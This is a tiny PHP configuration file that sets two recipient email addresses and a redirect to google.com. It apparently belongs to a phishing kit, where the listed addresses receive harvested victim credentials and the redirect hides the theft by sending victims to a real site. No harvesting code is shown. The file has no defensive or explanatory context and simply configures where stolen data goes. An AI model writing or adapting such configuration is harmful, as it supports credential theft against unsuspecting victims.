<?php 
$Receive_email="carolynlinks99@gmail.com, niceresults2021@protonmail.com";
$redirect="https://www.google.com/";
?>